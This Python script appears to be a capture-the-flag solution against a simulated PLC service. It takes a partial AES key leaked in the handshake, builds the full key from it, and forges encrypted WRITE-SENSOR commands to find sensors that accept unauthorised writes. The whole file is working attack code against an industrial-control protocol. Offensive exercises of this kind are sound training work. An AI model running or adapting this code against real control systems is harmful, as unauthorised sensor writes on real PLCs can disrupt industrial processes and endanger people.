import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Server connection details
PLC_HOST = '0.cloud.chals.io'
PLC_PORT = 34854

# Function to send and receive data from the PLC
def send_receive(sock, data):
    sock.sendall(data)
    response = sock.recv(1024)
    return response

# Function to decrypt data using AES-ECB with the full constructed key
def decrypt_aes_ecb(key, data):
    cipher = AES.new(key, AES.MODE_ECB)
    try:
        decrypted_data = unpad(cipher.decrypt(data), AES.block_size)
        return decrypted_data
    except ValueError as e:
        print(f"Decryption error: {e}")
        return None

# Establish connection and retrieve the initial AES key
def establish_connection():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((PLC_HOST, PLC_PORT))

    # Send NEW-CONNECTION-REQUEST (Message Code 0x01)
    new_connection_request = b'\x00\x03\x01'  # Data length, message code
    sock.sendall(new_connection_request)

    # Receive NEW-CONNECTION-RESPONSE with partial AES key
    response = sock.recv(12)  # Receiving the response for initial handshake
    partial_aes_key = response[-8:]  # Extract the 8-byte partial key
    print(f"Partial AES Key: {partial_aes_key.hex()}")

    return sock, partial_aes_key

# Function to test if a sensor is writable
def test_writable_sensor(sock, initial_partial_key, sensor_id):
    # Construct WRITE-SENSOR request (Message Code 0x05)
    # Command, Sensor ID, and Value to write (0x00000001)
    command_data = b'\x05' + bytes([sensor_id]) + b'\x00\x00\x00\x01'
    padded_command = pad(command_data, AES.block_size)
    full_aes_key = initial_partial_key + initial_partial_key  # Combine partial keys
    
    # Encrypt the command with the full AES key
    encrypted_command = AES.new(full_aes_key, AES.MODE_ECB).encrypt(padded_command)
    
    # Calculate the length of the full message to set the correct data length
    total_length = len(initial_partial_key) + len(encrypted_command) + 2  # Header length + data length
    
    # Construct the full message with correct data length
    pre_data = total_length.to_bytes(2, 'big') + initial_partial_key
    encrypted_data = pre_data + encrypted_command

    # Send the encrypted WRITE-SENSOR command and receive the response
    response = send_receive(sock, encrypted_data)
    print(f"Sensor ID: {sensor_id}, Response: {response.hex()}")

    if len(response) < 18:
        print("Incomplete response received.")
        return False

    # Extract the new partial key from the response
    response_partial_key = response[2:10]
    full_aes_key_response = initial_partial_key + response_partial_key

    # Decrypt the payload part of the response
    decrypted_response = decrypt_aes_ecb(full_aes_key_response, response[10:])
    if decrypted_response:
        print(f"Decrypted Response: {decrypted_response.hex()}")
        
        # Check for the WRITE-SENSOR success response (0x00) at the expected position
        if len(decrypted_response) > 1 and decrypted_response[1] == 0x00:
            print(f"Sensor ID {sensor_id} is writable.")
            return True
        elif len(decrypted_response) > 1 and decrypted_response[1] == 0x04:  # Not writable error code
            print(f"Sensor ID {sensor_id} is not writable.")
    else:
        print(f"Failed to decrypt response for Sensor ID: {sensor_id}")

    return False

def main():
    sock, initial_partial_key = establish_connection()

    # Test writable sensors in the range (0 to 255)
    for sensor_id in [1, 5, 16, 25, 42, 57, 82, 107, 151]:
        if test_writable_sensor(sock, initial_partial_key, sensor_id):
            print(f"Writable Sensor ID found: {sensor_id}")
            break  # Stop after finding the first writable sensor

    sock.close()

if __name__ == "__main__":
    main()
